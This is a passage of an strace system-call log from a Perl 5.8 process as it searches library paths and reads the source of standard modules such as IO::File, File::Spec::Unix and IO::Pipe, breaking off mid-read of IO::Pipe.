12518 20:27:41.857953 stat64("/usr/local/lib/perl/5.8.8/IO/File.pm", 0xbfa2b68c) = -1 ENOENT (No such file or directory)
12518 20:27:41.857968 stat64("/usr/local/share/perl/5.8.8/IO/File.pmc", 0xbfa2b77c) = -1 ENOENT (No such file or directory)
12518 20:27:41.857981 stat64("/usr/local/share/perl/5.8.8/IO/File.pm", 0xbfa2b68c) = -1 ENOENT (No such file or directory)
12518 20:27:41.857995 stat64("/usr/lib/perl5/IO/File.pmc", 0xbfa2b77c) = -1 ENOENT (No such file or directory)
12518 20:27:41.887259 stat64("/usr/lib/perl5/IO/File.pm", 0xbfa2b68c) = -1 ENOENT (No such file or directory)
12518 20:27:41.887259 stat64("/usr/share/perl5/IO/File.pmc", 0xbfa2b77c) = -1 ENOENT (No such file or directory)
12518 20:27:41.887260 stat64("/usr/share/perl5/IO/File.pm", 0xbfa2b68c) = -1 ENOENT (No such file or directory)
12518 20:27:41.887260 stat64("/usr/lib/perl/5.8/IO/File.pmc", 0xbfa2b77c) = -1 ENOENT (No such file or directory)
12518 20:27:41.887284 stat64("/usr/lib/perl/5.8/IO/File.pm", {st_mode=S_IFREG|0644, st_size=1784, ...}) = 0
12518 20:27:41.887309 open("/usr/lib/perl/5.8/IO/File.pm", O_RDONLY|O_LARGEFILE) = 6
12518 20:27:41.887326 ioctl(6, SNDCTL_TMR_TIMEBASE or TCGETS, 0xbfa2b498) = -1 ENOTTY (Inappropriate ioctl for device)
12518 20:27:41.887339 _llseek(6, 0, [0], SEEK_CUR) = 0
12518 20:27:41.887364 read(6, "#\n\npackage IO::File;\n\nuse 5.006_001;\nuse strict;\nour($VERSION, @EXPORT, @EXPORT_OK, @ISA);\nuse Carp;\nuse Symbol;\nuse SelectSaver;\nuse IO::Seekable;\nuse File::Spec;\n\nrequire Exporter;\n\n@ISA = qw(IO::Handle IO::Seekable Exporter);\n\n$VERSION = \"1.13\";\n\n@EXPORT = @IO::Seekable::EXPORT;\n\neval {\n    # Make all Fcntl O_XXX constants available for importing\n    require Fcntl;\n    my @O = grep /^O_/, @Fcntl::EXPORT;\n    Fcntl->import(@O);  # first we import what we want to export\n    push(@EXPORT, @O);\n};\n\n################################################\n## Constructor\n##\n\nsub new {\n    my $type = shift;\n    my $class = ref($type) || $type || \"IO::File\";\n    @_ >= 0 && @_ <= 3\n\tor croak \"usage: new $class [FILENAME [,MODE [,PERMS]]]\";\n    my $fh = $class->SUPER::new();\n    if (@_) {\n\t$fh->open(@_)\n\t    or return undef;\n    }\n    $fh;\n}\n\n################################################\n## Open\n##\n\nsub open {\n    @_ >= 2 && @_ <= 4 or croak \'usage: $fh->open(FILENAME [,MODE [,PERMS]])\';\n    my ($fh, $file) = @_;\n    if (@_ > 2) {\n\tmy ($mode, $perms) = @_[2, 3];\n\tif ($mode =~ /^\\d+$/) {\n\t    defined $perms or $perms = 0666;\n\t    return sysopen($fh, $file, $mode, $perms);\n\t} elsif ($mode =~ /:/) {\n\t    return open($fh, $mode, $file) if @_ == 3;\n\t    croak \'usage: $fh->open(FILENAME, IOLAYERS)\';\n\t}\n\tif (defined($file) && length($file)\n\t    && ! File::Spec->file_name_is_absolute($file))\n\t{\n\t    $file = File::Spec->rel2abs($file);\n\t}\n\t$file = IO::Handle::_open_mode_string($mode) . \" $file\\0\";\n    }\n    open($fh, $file);\n}\n\n################################################\n## Binmode\n##\n\nsub binmode {\n    ( @_ == 1 or @_ == 2 ) or croak \'usage $fh->binmode([LAYER])\';\n\n    my($fh, $layer) = @_;\n\n    return binmode $$fh unless $layer;\n    return binmode $$fh, $layer;\n}\n\n1;\n", 4096) = 1784
12518 20:27:41.887653 stat64("/etc/perl/File/Spec.pmc", 0xbfa2b2cc) = -1 ENOENT (No such file or directory)
12518 20:27:41.887684 stat64("/etc/perl/File/Spec.pm", 0xbfa2b1dc) = -1 ENOENT (No such file or directory)
12518 20:27:41.887698 stat64("/usr/local/lib/perl/5.8.8/File/Spec.pmc", 0xbfa2b2cc) = -1 ENOENT (No such file or directory)
12518 20:27:41.887712 stat64("/usr/local/lib/perl/5.8.8/File/Spec.pm", 0xbfa2b1dc) = -1 ENOENT (No such file or directory)
12518 20:27:41.887726 stat64("/usr/local/share/perl/5.8.8/File/Spec.pmc", 0xbfa2b2cc) = -1 ENOENT (No such file or directory)
12518 20:27:41.887740 stat64("/usr/local/share/perl/5.8.8/File/Spec.pm", 0xbfa2b1dc) = -1 ENOENT (No such file or directory)
12518 20:27:41.887754 stat64("/usr/lib/perl5/File/Spec.pmc", 0xbfa2b2cc) = -1 ENOENT (No such file or directory)
12518 20:27:41.887766 stat64("/usr/lib/perl5/File/Spec.pm", 0xbfa2b1dc) = -1 ENOENT (No such file or directory)
12518 20:27:41.887780 stat64("/usr/share/perl5/File/Spec.pmc", 0xbfa2b2cc) = -1 ENOENT (No such file or directory)
12518 20:27:41.887793 stat64("/usr/share/perl5/File/Spec.pm", 0xbfa2b1dc) = -1 ENOENT (No such file or directory)
12518 20:27:41.887807 stat64("/usr/lib/perl/5.8/File/Spec.pmc", 0xbfa2b2cc) = -1 ENOENT (No such file or directory)
12518 20:27:41.887820 stat64("/usr/lib/perl/5.8/File/Spec.pm", 0xbfa2b1dc) = -1 ENOENT (No such file or directory)
12518 20:27:41.887834 stat64("/usr/share/perl/5.8/File/Spec.pmc", 0xbfa2b2cc) = -1 ENOENT (No such file or directory)
12518 20:27:41.887847 stat64("/usr/share/perl/5.8/File/Spec.pm", {st_mode=S_IFREG|0644, st_size=595, ...}) = 0
12518 20:27:41.887869 open("/usr/share/perl/5.8/File/Spec.pm", O_RDONLY|O_LARGEFILE) = 8
12518 20:27:41.887884 ioctl(8, SNDCTL_TMR_TIMEBASE or TCGETS, 0xbfa2afe8) = -1 ENOTTY (Inappropriate ioctl for device)
12518 20:27:41.887896 _llseek(8, 0, [0], SEEK_CUR) = 0
12518 20:27:41.887914 read(8, "package File::Spec;\n\nuse strict;\nuse vars qw(@ISA $VERSION);\n\n$VERSION = \'3.12\';\n$VERSION = eval $VERSION;\n\nmy %module = (MacOS   => \'Mac\',\n\t      MSWin32 => \'Win32\',\n\t      os2     => \'OS2\',\n\t      VMS     => \'VMS\',\n\t      epoc    => \'Epoc\',\n\t      NetWare => \'Win32\', # Yes, File::Spec::Win32 works on NetWare.\n\t      symbian => \'Win32\', # Yes, File::Spec::Win32 works on symbian.\n\t      dos     => \'OS2\',   # Yes, File::Spec::OS2 works on DJGPP.\n\t      cygwin  => \'Cygwin\');\n\nmy $module = $module{$^O} || \'Unix\';\n\nrequire \"File/Spec/$module.pm\";\n@ISA = (\"File::Spec::$module\");\n\n1;\n\n__END__\n\n", 4096) = 595
12518 20:27:41.887991 stat64("/etc/perl/vars.pmc", 0xbfa2ae1c) = -1 ENOENT (No such file or directory)
12518 20:27:41.888006 stat64("/etc/perl/vars.pm", 0xbfa2ad2c) = -1 ENOENT (No such file or directory)
12518 20:27:41.888019 stat64("/usr/local/lib/perl/5.8.8/vars.pmc", 0xbfa2ae1c) = -1 ENOENT (No such file or directory)
12518 20:27:41.888032 stat64("/usr/local/lib/perl/5.8.8/vars.pm", 0xbfa2ad2c) = -1 ENOENT (No such file or directory)
12518 20:27:41.888046 stat64("/usr/local/share/perl/5.8.8/vars.pmc", 0xbfa2ae1c) = -1 ENOENT (No such file or directory)
12518 20:27:41.888058 stat64("/usr/local/share/perl/5.8.8/vars.pm", 0xbfa2ad2c) = -1 ENOENT (No such file or directory)
12518 20:27:41.888073 stat64("/usr/lib/perl5/vars.pmc", 0xbfa2ae1c) = -1 ENOENT (No such file or directory)
12518 20:27:41.888085 stat64("/usr/lib/perl5/vars.pm", 0xbfa2ad2c) = -1 ENOENT (No such file or directory)
12518 20:27:41.888099 stat64("/usr/share/perl5/vars.pmc", 0xbfa2ae1c) = -1 ENOENT (No such file or directory)
12518 20:27:41.888111 stat64("/usr/share/perl5/vars.pm", 0xbfa2ad2c) = -1 ENOENT (No such file or directory)
12518 20:27:41.888125 stat64("/usr/lib/perl/5.8/vars.pmc", 0xbfa2ae1c) = -1 ENOENT (No such file or directory)
12518 20:27:41.888148 stat64("/usr/lib/perl/5.8/vars.pm", 0xbfa2ad2c) = -1 ENOENT (No such file or directory)
12518 20:27:41.888162 stat64("/usr/share/perl/5.8/vars.pmc", 0xbfa2ae1c) = -1 ENOENT (No such file or directory)
12518 20:27:41.888175 stat64("/usr/share/perl/5.8/vars.pm", {st_mode=S_IFREG|0644, st_size=1149, ...}) = 0
12518 20:27:41.888200 open("/usr/share/perl/5.8/vars.pm", O_RDONLY|O_LARGEFILE) = 10
12518 20:27:41.888214 ioctl(10, SNDCTL_TMR_TIMEBASE or TCGETS, 0xbfa2ab38) = -1 ENOTTY (Inappropriate ioctl for device)
12518 20:27:41.888225 _llseek(10, 0, [0], SEEK_CUR) = 0
12518 20:27:41.888242 read(10, "package vars;\n\nuse 5.006;\n\nour $VERSION = \'1.01\';\n\nuse warnings::register;\nuse strict qw(vars subs);\n\nsub import {\n    my $callpack = caller;\n    my ($pack, @imports) = @_;\n    my ($sym, $ch);\n    foreach (@imports) {\n        if (($ch, $sym) = /^([\\$\\@\\%\\*\\&])(.+)/) {\n\t    if ($sym =~ /\\W/) {\n\t\t# time for a more-detailed check-up\n\t\tif ($sym =~ /^\\w+[[{].*[]}]$/) {\n\t\t    require Carp;\n\t\t    Carp::croak(\"Can\'t declare individual elements of hash or array\");\n\t\t} elsif (warnings::enabled() and length($sym) == 1 and $sym !~ tr/a-zA-Z//) {\n\t\t    warnings::warn(\"No need to declare built-in vars\");\n\t\t} elsif  (($^H &= strict::bits(\'vars\'))) {\n\t\t    require Carp;\n\t\t    Carp::croak(\"\'$_\' is not a valid variable name under strict vars\");\n\t\t}\n\t    }\n\t    $sym = \"${callpack}::$sym\" unless $sym =~ /::/;\n\t    *$sym =\n\t\t(  $ch eq \"\\$\" ? \\$$sym\n\t\t : $ch eq \"\\@\" ? \\@$sym\n\t\t : $ch eq \"\\%\" ? \\%$sym\n\t\t : $ch eq \"\\*\" ? \\*$sym\n\t\t : $ch eq \"\\&\" ? \\&$sym \n\t\t : do {\n\t\t     require Carp;\n\t\t     Carp::croak(\"\'$_\' is not a valid variable name\");\n\t\t });\n\t} else {\n\t    require Carp;\n\t    Carp::croak(\"\'$_\' is not a valid variable name\");\n\t}\n    }\n};\n\n1;\n__END__\n\n", 4096) = 1149
12518 20:27:41.888357 stat64("/etc/perl/warnings/register.pmc", 0xbfa2a96c) = -1 ENOENT (No such file or directory)
12518 20:27:41.888372 stat64("/etc/perl/warnings/register.pm", 0xbfa2a87c) = -1 ENOENT (No such file or directory)
12518 20:27:41.888386 stat64("/usr/local/lib/perl/5.8.8/warnings/register.pmc", 0xbfa2a96c) = -1 ENOENT (No such file or directory)
12518 20:27:41.888400 stat64("/usr/local/lib/perl/5.8.8/warnings/register.pm", 0xbfa2a87c) = -1 ENOENT (No such file or directory)
12518 20:27:41.888414 stat64("/usr/local/share/perl/5.8.8/warnings/register.pmc", 0xbfa2a96c) = -1 ENOENT (No such file or directory)
12518 20:27:41.888428 stat64("/usr/local/share/perl/5.8.8/warnings/register.pm", 0xbfa2a87c) = -1 ENOENT (No such file or directory)
12518 20:27:41.888442 stat64("/usr/lib/perl5/warnings/register.pmc", 0xbfa2a96c) = -1 ENOENT (No such file or directory)
12518 20:27:41.888455 stat64("/usr/lib/perl5/warnings/register.pm", 0xbfa2a87c) = -1 ENOENT (No such file or directory)
12518 20:27:41.888469 stat64("/usr/share/perl5/warnings/register.pmc", 0xbfa2a96c) = -1 ENOENT (No such file or directory)
12518 20:27:41.888482 stat64("/usr/share/perl5/warnings/register.pm", 0xbfa2a87c) = -1 ENOENT (No such file or directory)
12518 20:27:41.888496 stat64("/usr/lib/perl/5.8/warnings/register.pmc", 0xbfa2a96c) = -1 ENOENT (No such file or directory)
12518 20:27:41.888509 stat64("/usr/lib/perl/5.8/warnings/register.pm", 0xbfa2a87c) = -1 ENOENT (No such file or directory)
12518 20:27:41.888524 stat64("/usr/share/perl/5.8/warnings/register.pmc", 0xbfa2a96c) = -1 ENOENT (No such file or directory)
12518 20:27:41.888537 stat64("/usr/share/perl/5.8/warnings/register.pm", {st_mode=S_IFREG|0644, st_size=732, ...}) = 0
12518 20:27:41.888559 open("/usr/share/perl/5.8/warnings/register.pm", O_RDONLY|O_LARGEFILE) = 11
12518 20:27:41.888574 ioctl(11, SNDCTL_TMR_TIMEBASE or TCGETS, 0xbfa2a688) = -1 ENOTTY (Inappropriate ioctl for device)
12518 20:27:41.888585 _llseek(11, 0, [0], SEEK_CUR) = 0
12518 20:27:41.888607 read(11, "package warnings::register;\n\nour $VERSION = \'1.01\';\n\nrequire warnings;\n\nsub mkMask\n{\n    my ($bit) = @_;\n    my $mask = \"\";\n\n    vec($mask, $bit, 1) = 1;\n    return $mask;\n}\n\nsub import\n{\n    shift;\n    my $package = (caller(0))[0];\n    if (! defined $warnings::Bits{$package}) {\n        $warnings::Bits{$package}     = mkMask($warnings::LAST_BIT);\n        vec($warnings::Bits{\'all\'}, $warnings::LAST_BIT, 1) = 1;\n        $warnings::Offsets{$package}  = $warnings::LAST_BIT ++;\n\tforeach my $k (keys %warnings::Bits) {\n\t    vec($warnings::Bits{$k}, $warnings::LAST_BIT, 1) = 0;\n\t}\n        $warnings::DeadBits{$package} = mkMask($warnings::LAST_BIT);\n        vec($warnings::DeadBits{\'all\'}, $warnings::LAST_BIT++, 1) = 1;\n    }\n}\n\n1;\n", 4096) = 732
12518 20:27:41.888771 read(11, "", 4096) = 0
12518 20:27:41.888785 close(11)         = 0
12518 20:27:41.888995 _llseek(10, 1148, [1148], SEEK_SET) = 0
12518 20:27:41.889011 _llseek(10, 0, [1148], SEEK_CUR) = 0
12518 20:27:41.889021 close(10)         = 0
12518 20:27:41.889093 _llseek(8, 594, [594], SEEK_SET) = 0
12518 20:27:41.889107 _llseek(8, 0, [594], SEEK_CUR) = 0
12518 20:27:41.889118 close(8)          = 0
12518 20:27:41.889166 stat64("/etc/perl/File/Spec/Unix.pmc", 0xbfa2b2cc) = -1 ENOENT (No such file or directory)
12518 20:27:41.889182 stat64("/etc/perl/File/Spec/Unix.pm", 0xbfa2b1dc) = -1 ENOENT (No such file or directory)
12518 20:27:41.889196 stat64("/usr/local/lib/perl/5.8.8/File/Spec/Unix.pmc", 0xbfa2b2cc) = -1 ENOENT (No such file or directory)
12518 20:27:41.889210 stat64("/usr/local/lib/perl/5.8.8/File/Spec/Unix.pm", 0xbfa2b1dc) = -1 ENOENT (No such file or directory)
12518 20:27:41.889225 stat64("/usr/local/share/perl/5.8.8/File/Spec/Unix.pmc", 0xbfa2b2cc) = -1 ENOENT (No such file or directory)
12518 20:27:41.889238 stat64("/usr/local/share/perl/5.8.8/File/Spec/Unix.pm", 0xbfa2b1dc) = -1 ENOENT (No such file or directory)
12518 20:27:41.889253 stat64("/usr/lib/perl5/File/Spec/Unix.pmc", 0xbfa2b2cc) = -1 ENOENT (No such file or directory)
12518 20:27:41.889266 stat64("/usr/lib/perl5/File/Spec/Unix.pm", 0xbfa2b1dc) = -1 ENOENT (No such file or directory)
12518 20:27:41.889280 stat64("/usr/share/perl5/File/Spec/Unix.pmc", 0xbfa2b2cc) = -1 ENOENT (No such file or directory)
12518 20:27:41.889293 stat64("/usr/share/perl5/File/Spec/Unix.pm", 0xbfa2b1dc) = -1 ENOENT (No such file or directory)
12518 20:27:41.889307 stat64("/usr/lib/perl/5.8/File/Spec/Unix.pmc", 0xbfa2b2cc) = -1 ENOENT (No such file or directory)
12518 20:27:41.889321 stat64("/usr/lib/perl/5.8/File/Spec/Unix.pm", 0xbfa2b1dc) = -1 ENOENT (No such file or directory)
12518 20:27:41.889335 stat64("/usr/share/perl/5.8/File/Spec/Unix.pmc", 0xbfa2b2cc) = -1 ENOENT (No such file or directory)
12518 20:27:41.889349 stat64("/usr/share/perl/5.8/File/Spec/Unix.pm", {st_mode=S_IFREG|0644, st_size=7038, ...}) = 0
12518 20:27:41.889372 open("/usr/share/perl/5.8/File/Spec/Unix.pm", O_RDONLY|O_LARGEFILE) = 8
12518 20:27:41.889388 ioctl(8, SNDCTL_TMR_TIMEBASE or TCGETS, 0xbfa2afe8) = -1 ENOTTY (Inappropriate ioctl for device)
12518 20:27:41.889399 _llseek(8, 0, [0], SEEK_CUR) = 0
12518 20:27:41.889418 read(8, "package File::Spec::Unix;\n\nuse strict;\nuse vars qw($VERSION);\n\n$VERSION = \'1.5\';\n\nsub canonpath {\n    my ($self,$path) = @_;\n    \n    # Handle POSIX-style node names beginning with double slash (qnx, nto)\n    # Handle network path names beginning with double slash (cygwin)\n    # (POSIX says: \"a pathname that begins with two successive slashes\n    # may be interpreted in an implementation-defined manner, although\n    # more than two leading slashes shall be treated as a single slash.\")\n    my $node = \'\';\n    if ( $^O =~ m/^(?:qnx|nto|cygwin)$/ && $path =~ s:^(//[^/]+)(/|\\z):/:s ) {\n      $node = $1;\n    }\n    # This used to be\n    # $path =~ s|/+|/|g unless($^O eq \'cygwin\');\n    # but that made tests 29, 30, 35, 46, and 213 (as of #13272) to fail\n    # (Mainly because trailing \"\" directories didn\'t get stripped).\n    # Why would cygwin avoid collapsing multiple slashes into one? --jhi\n    $path =~ s|/+|/|g;                             # xx////xx  -> xx/xx\n    $path =~ s@(/\\.)+(/|\\Z(?!\\n))@/@g;             # xx/././xx -> xx/xx\n    $path =~ s|^(\\./)+||s unless $path eq \"./\";    # ./xx      -> xx\n    $path =~ s|^/(\\.\\./)+|/|;                      # /../../xx -> xx\n    $path =~ s|^/\\.\\.$|/|;                         # /..       -> /\n    $path =~ s|/\\Z(?!\\n)|| unless $path eq \"/\";          # xx/       -> xx\n    return \"$node$path\";\n}\n\nsub catdir {\n    my $self = shift;\n\n    $self->canonpath(join(\'/\', @_, \'\')); # \'\' because need a trailing \'/\'\n}\n\nsub catfile {\n    my $self = shift;\n    my $file = $self->canonpath(pop @_);\n    return $file unless @_;\n    my $dir = $self->catdir(@_);\n    $dir .= \"/\" unless substr($dir,-1) eq \"/\";\n    return $dir.$file;\n}\n\nsub curdir () { \'.\' }\n\nsub devnull () { \'/dev/null\' }\n\nsub rootdir () { \'/\' }\n\nmy $tmpdir;\nsub _tmpdir {\n    return $tmpdir if defined $tmpdir;\n    my $self = shift;\n    my @dirlist = @_;\n    {\n\tno strict \'refs\';\n\tif (${\"\\cTAINT\"}) { # Check for taint mode on perl >= 5.8.0\n            require Scalar::Util;\n\t    @dirlist = grep { ! Scalar::Util::tainted($_) } @dirlist;\n\t}\n    }\n    foreach (@dirlist) {\n\tnext unless defined && -d && -w _;\n\t$tmpdir = $_;\n\tlast;\n    }\n    $tmpdir = $self->curdir unless defined $tmpdir;\n    $tmpdir = defined $tmpdir && $self->canonpath($tmpdir);\n    return $tmpdir;\n}\n\nsub tmpdir {\n    return $tmpdir if defined $tmpdir;\n    $tmpdir = $_[0]->_tmpdir( $ENV{TMPDIR}, \"/tmp\" );\n}\n\nsub updir () { \'..\' }\n\nsub no_upwards {\n    my $self = shift;\n    return grep(!/^\\.{1,2}\\Z(?!\\n)/s, @_);\n}\n\nsub case_tolerant () { 0 }\n\nsub file_name_is_absolute {\n    my ($self,$file) = @_;\n    return scalar($file =~ m:^/:s);\n}\n\nsub path {\n    return () unless exists $ENV{PATH};\n    my @path = split(\':\', $ENV{PATH});\n    foreach (@path) { $_ = \'.\' if $_ eq \'\' }\n    return @path;\n}\n\nsub join {\n    my $self = shift;\n    return $self->catfile(@_);\n}\n\nsub splitpath {\n    my ($self,$path, $nofile) = @_;\n\n    my ($volume,$directory,$file) = (\'\',\'\',\'\');\n\n    if ( $nofile ) {\n        $directory = $path;\n    }\n    else {\n        $path =~ m|^ ( (?: .* / (?: \\.\\.?\\Z(?!\\n) )? )? ) ([^/]*) |xs;\n        $directory = $1;\n        $file      = $2;\n    }\n\n    return ($volume,$directory,$file);\n}\n\nsub splitdir {\n    return split m|/|, $_[1], -1;  # Preserve trailing fields\n}\n\nsub catpath {\n    my ($self,$volume,$directory,$file) = @_;\n\n    if ( $directory ne \'\'                && \n         $file ne \'\'                     && \n         substr( $directory, -1 ) ne \'/\' && \n         substr( $file, 0, 1 ) ne \'/\' \n    ) {\n        $directory .= \"/$file\" ;\n    }\n    else {\n        $directory .= $file ;\n    }\n\n    return $directory ;\n}\n\nsub abs2rel {\n    my($self,$path,$base) = @_;\n\n    # Figure out the effective $base and clean it up.\n    if ( !defined( $base ) || $base eq \'\' ) {\n        $base = $self->_cwd();\n    }\n    elsif ( ! $self->file_name_is_absolute( $base ) ) {\n\tif ( ! $self->file_name_is_absolute( $path ) ) {\n\t    # optimisation where both paths are relative: save 2 x cwd\n\t    $base = $self->canonpath( \"/$base\" );\n\t    $path = \"/$path\";\n\t}\n\telse {\n\t    $base = $self->rel2abs( $base ) ;\n\t}\n    }\n  ", 4096) = 4096
12518 20:27:41.890088 brk(0x8218000)    = 0x8218000
12518 20:27:41.890346 read(8, "  else {\n        $base = $self->canonpath( $base ) ;\n    }\n\n    # Clean up $path\n    if ( ! $self->file_name_is_absolute( $path ) ) {\n        $path = $self->rel2abs( $path ) ;\n    }\n    else {\n        $path = $self->canonpath( $path ) ;\n    }\n\n    # Now, remove all leading components that are the same\n    my @pathchunks = $self->splitdir( $path);\n    my @basechunks = $self->splitdir( $base);\n\n    while (@pathchunks && @basechunks && $pathchunks[0] eq $basechunks[0]) {\n        shift @pathchunks ;\n        shift @basechunks ;\n    }\n\n    $path = CORE::join( \'/\', @pathchunks );\n    $base = CORE::join( \'/\', @basechunks );\n\n    # $base now contains the directories the resulting relative path \n    # must ascend out of before it can descend to $path_directory.  So, \n    # replace all names with $parentDir\n    $base =~ s|[^/]+|..|g ;\n\n    # Glue the two together, using a separator if necessary, and preventing an\n    # empty result.\n    if ( $path ne \'\' && $base ne \'\' ) {\n        $path = \"$base/$path\" ;\n    } else {\n        $path = \"$base$path\" ;\n    }\n\n    return $self->canonpath( $path ) ;\n}\n\nsub rel2abs {\n    my ($self,$path,$base ) = @_;\n\n    # Clean up $path\n    if ( ! $self->file_name_is_absolute( $path ) ) {\n        # Figure out the effective $base and clean it up.\n        if ( !defined( $base ) || $base eq \'\' ) {\n\t    $base = $self->_cwd();\n        }\n        elsif ( ! $self->file_name_is_absolute( $base ) ) {\n            $base = $self->rel2abs( $base ) ;\n        }\n        else {\n            $base = $self->canonpath( $base ) ;\n        }\n\n        # Glom them together\n        $path = $self->catdir( $base, $path ) ;\n    }\n\n    return $self->canonpath( $path ) ;\n}\n\n# Internal routine to File::Spec, no point in making this public since\n# it is the standard Cwd interface.  Most of the platform-specific\n# File::Spec subclasses use this.\nsub _cwd {\n    require Cwd;\n    Cwd::cwd();\n}\n\n# Internal method to reduce xx\\..\\yy -> yy\nsub _collapse {\n    my($fs, $path) = @_;\n\n    my $updir  = $fs->updir;\n    my $curdir = $fs->curdir;\n\n    my($vol, $dirs, $file) = $fs->splitpath($path);\n    my @dirs = $fs->splitdir($dirs);\n\n    my @collapsed;\n    foreach my $dir (@dirs) {\n        if( $dir eq $updir              and   # if we have an updir\n            @collapsed                  and   # and something to collapse\n            length $collapsed[-1]       and   # and its not the rootdir\n            $collapsed[-1] ne $updir    and   # nor another updir\n            $collapsed[-1] ne $curdir         # nor the curdir\n          ) \n        {                                     # then\n            pop @collapsed;                   # collapse\n        }\n        else {                                # else\n            push @collapsed, $dir;            # just hang onto it\n        }\n    }\n\n    return $fs->catpath($vol,\n                        $fs->catdir(@collapsed),\n                        $file\n                       );\n}\n\n1;\n", 4096) = 2942
12518 20:27:41.890737 read(8, "", 4096) = 0
12518 20:27:41.890754 close(8)          = 0
12518 20:27:41.890948 read(6, "", 4096) = 0
12518 20:27:41.890963 close(6)          = 0
12518 20:27:41.891150 stat64("/etc/perl/IO/Pipe.pmc", 0xbfa2b77c) = -1 ENOENT (No such file or directory)
12518 20:27:41.891168 stat64("/etc/perl/IO/Pipe.pm", 0xbfa2b68c) = -1 ENOENT (No such file or directory)
12518 20:27:41.891183 stat64("/usr/local/lib/perl/5.8.8/IO/Pipe.pmc", 0xbfa2b77c) = -1 ENOENT (No such file or directory)
12518 20:27:41.891196 stat64("/usr/local/lib/perl/5.8.8/IO/Pipe.pm", 0xbfa2b68c) = -1 ENOENT (No such file or directory)
12518 20:27:41.891211 stat64("/usr/local/share/perl/5.8.8/IO/Pipe.pmc", 0xbfa2b77c) = -1 ENOENT (No such file or directory)
12518 20:27:41.891224 stat64("/usr/local/share/perl/5.8.8/IO/Pipe.pm", 0xbfa2b68c) = -1 ENOENT (No such file or directory)
12518 20:27:41.891238 stat64("/usr/lib/perl5/IO/Pipe.pmc", 0xbfa2b77c) = -1 ENOENT (No such file or directory)
12518 20:27:41.891250 stat64("/usr/lib/perl5/IO/Pipe.pm", 0xbfa2b68c) = -1 ENOENT (No such file or directory)
12518 20:27:41.891263 stat64("/usr/share/perl5/IO/Pipe.pmc", 0xbfa2b77c) = -1 ENOENT (No such file or directory)
12518 20:27:41.891275 stat64("/usr/share/perl5/IO/Pipe.pm", 0xbfa2b68c) = -1 ENOENT (No such file or directory)
12518 20:27:41.891289 stat64("/usr/lib/perl/5.8/IO/Pipe.pmc", 0xbfa2b77c) = -1 ENOENT (No such file or directory)
12518 20:27:41.891302 stat64("/usr/lib/perl/5.8/IO/Pipe.pm", {st_mode=S_IFREG|0644, st_size=3426, ...}) = 0
12518 20:27:41.891323 open("/usr/lib/perl/5.8/IO/Pipe.pm", O_RDONLY|O_LARGEFILE) = 6
12518 20:27:41.891338 ioctl(6, SNDCTL_TMR_TIMEBASE or TCGETS, 0xbfa2b498) = -1 ENOTTY (Inappropriate ioctl for device)
12518 20:27:41.891350 _llseek(6, 0, [0], SEEK_CUR) = 0
12518 20:27:41.891371 read(6, "# IO::Pipe.pm\n#\n# Copyright (c) 1996-8 Graham Barr <gbarr@pobox.com>. All rights reserved.\n# This program is free software; you can redistribute it and/or\n# modify it under the same terms as Perl itself.\n\npackage IO::Pipe;\n\nuse 5.006_001;\n\nuse IO::Handle;\nuse strict;\nour($VERSION);\nuse Carp;\nuse Symbol;\n\n$VERSION = \"1.13\";\n\nsub new {\n    my $type = shift;\n    my $class = ref($type) || $type || \"IO::Pipe\";\n    @_ == 0 || @_ == 2 or croak \"usage: new $class [READFH, WRITEFH]\";\n\n    my $me = bless gensym(), $class;\n\n    my($readfh,$writefh) = @_ ? @_ : $me->handles;\n\n    pipe($readfh, $writefh)\n\tor return undef;\n\n    @{*$me} = ($readfh, $writefh);\n\n    $me;\n}\n\nsub handles {\n    @_ == 1 or croak \'usage: $pipe->handles()\';\n    (IO::Pipe::End->new(), IO::Pipe::End->new());\n}\n\nmy $do_spawn = $^O eq \'os2\' || $^O eq \'MSWin32\';\n\nsub _doit {\n    my $me = shift;\n    my $rw = shift;\n\n    my $pid = $do_spawn ? 0 : fork();\n\n    if($pid) { # Parent\n        return $pid;\n    }\n    elsif(defined $pid) { # Child or spawn\n        my $fh;\n        my $io = $rw ? \\*STDIN : \\*STDOUT;\n        my ($mode, $save) = $rw ? \"r\" : \"w\";\n        if ($do_spawn) {\n          require Fcntl;\n          $save = IO::Handle->new_from_fd($io, $mode);\n\t  my $handle = shift;\n          # Close in child:\n\t  unless ($^O eq \'MSWin32\') {\n            fcntl($handle, Fcntl::F_SETFD(), 1) or croak \"fcntl: $!\";\n\t  }\n          $fh = $rw ? ${*$me}[0] : ${*$me}[1];\n        } else {\n          shift;\n          $fh = $rw ? $me->reader() : $me->writer(); # close the other end\n        }\n        bless $io, \"IO::Handle\";\n        $io->fdopen($fh, $mode);\n\t$fh->close;\n\n        if ($do_spawn) {\n          $pid = eval { system 1, @_ }; # 1 == P_NOWAIT\n          my $err = $!;\n    \n          $io->fdopen($save, $mode);\n          $save->close or croak \"Cannot close $!\";\n          croak \"IO::Pipe: Cannot spawn-NOWAIT: $err\" if not $pid or $pid < 0;\n          return $pid;\n        } else {\n          exec @_ or\n            croak \"IO::Pipe: Cannot exec: $!\";\n        }\n    }\n    else {\n        croak \"IO::Pipe: Cannot fork: $!\";\n    }\n\n    # NOT Reached\n}\n\nsub reader {\n    @_ >= 1 or croak \'usage: $pipe->reader( [SUB_COMMAND_ARGS] )\';\n    my $me = shift;\n\n    return undef\n\tunless(ref($me) || ref($me = $me->new));\n\n    my $fh  = ${*$me}[0];\n    my $pid;\n    $pid = $me->_doit(0, $fh, @_)\n        if(@_);\n\n    close ${*$me}[1];\n    bless $me, ref($fh);\n    *$me = *$fh;          # Alias self to handle\n    $me->fdopen($fh->fileno,\"r\")\n\tunless defined($me->fileno);\n    bless $fh;                  # Really wan\'t un-bless here\n    ${*$me}{\'io_pipe_pid\'} = $pid\n        if defined $pid;\n\n    $me;\n}\n\nsub writer {\n    @_ >= 1 or croak \'usage: $pipe->writer( [SUB_COMMAND_ARGS] )\';\n    my $me = shift;\n\n    return undef\n\tunless(ref($me) || ref($me = $me->new));\n\n    my $fh  = ${*$me}[1];\n    my $pid;\n    $pid = $me->_doit(1, $fh, @_)\n        if(@_);\n\n    close ${*$me}[0];\n    bless $me, ref($fh);\n    *$me = *$fh;          # Alias self to handle\n    $me->fdopen($fh->fileno,\"w\")\n\tunless defined($me->fileno);\n    bless $fh;                  # Really wan\'t un-bless here\n    ${*$me}{\'io_pipe_pid\'} = $pid\n        if defined $pid;\n\n    $me;\n}\n\npackage IO::Pipe::End;\n\nour(@ISA);\n\n@ISA = qw(IO::Handle);\n\nsub close {\n    my $fh = shift;\n    my $r = $fh->SUPER::close(@_);\n\n    waitpid(${*$fh}{\'io_pipe_pid\'},0)\n\tif(defined 